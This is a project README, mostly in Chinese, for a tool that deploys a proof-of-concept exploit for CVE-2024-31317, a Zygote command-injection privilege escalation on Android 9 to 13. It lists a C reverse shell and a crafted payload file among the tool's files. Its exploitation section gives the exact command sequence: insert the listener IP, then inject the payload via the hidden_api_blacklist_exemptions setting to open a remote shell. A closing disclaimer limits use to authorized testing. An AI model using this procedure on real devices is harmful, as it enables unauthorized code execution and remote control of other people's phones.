# CVE-2024-31317-PoC-Deployer

![Android Version](https://img.shields.io/badge/Android-9%20to%2013-red)
![Patch Level](https://img.shields.io/badge/Patch%20Level-June%202024%2B-green)
![License](https://img.shields.io/badge/License-MIT-blue)

A deployment tool for CVE-2024-31317 proof-of-concept exploit targeting Android 9 through 13 devices.

## 📝 项目描述

CVE-2024-31317-PoC-Deployer 是一个自动化部署脚本，用于快速生成和配置 CVE-2024-31317 漏洞利用所需的全部文件。该漏洞影响 Android 9 到 13 的设备，允许通过 Zygote 进程实现权限提升并执行任意代码。

## 🚨 漏洞信息

- **CVE ID**: CVE-2024-31317
- **影响范围**: Android 9 到 Android 13
- **修复版本**: 2024年6月补丁级别及以后的Android版本
- **漏洞类型**: Zygote进程命令注入
- **所需权限**: WRITE_SECURE_SETTINGS

## 📦 包含文件

- `reverse_shell.c` - C语言实现的反向shell程序
- `payload.txt` - 特殊构造的漏洞利用payload
- `compile.sh` - 自动编译脚本
- `README.txt` - 详细使用说明
- `CVE-2024-31317.txt` - 漏洞技术分析文档

## 🛠️ 快速开始

1. **运行部署脚本**:
   ```bash
   ./deploy.sh
   ```

2. **编译反向shell**:
   ```bash
   ./compile.sh
   ```

3. **运行反向shell监听器**:
   ```bash
   ./reverse_shell
   ```

## 💣 漏洞利用步骤

1. 上传 `payload.txt` 到目标设备的 `/data/local/tmp/`
2. 替换 payload.txt 中的 `xxx.xxx.xxx` 为你的监听服务器IP
3. 在目标设备上执行以下命令序列:
   ```bash
   am force-stop com.android.settings
   cd /data/local/tmp/
   settings put global hidden_api_blacklist_exemptions "$(cat payload.txt)"
   am start -n com.android.settings/.Settings
   settings put global hidden_api_blacklist_exemptions "null"
   ```

## ⚠️ 免责声明

此工具仅用于合法的安全测试和研究目的。使用前必须获得目标系统的明确授权。未经授权的使用可能违反法律。开发者不对任何滥用行为负责。

## 📜 许可证

本项目采用 MIT 许可证 - 详情请参阅 [LICENSE](LICENSE) 文件。

## 📚 技术参考

- [Android Security Bulletin - June 2024](https://source.android.com/docs/security/bulletin)
- [CVE-2024-31317 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-31317)
